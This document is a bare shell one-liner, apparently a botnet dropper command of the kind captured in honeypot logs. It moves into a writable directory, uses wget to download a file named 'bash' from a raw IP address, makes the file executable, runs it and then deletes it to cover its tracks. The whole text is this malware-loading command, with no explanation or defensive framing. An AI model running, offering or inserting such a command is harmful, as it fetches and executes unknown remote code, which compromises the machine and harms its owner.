cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.44/bash; chmod +x bash; ./bash; rm -rf bash
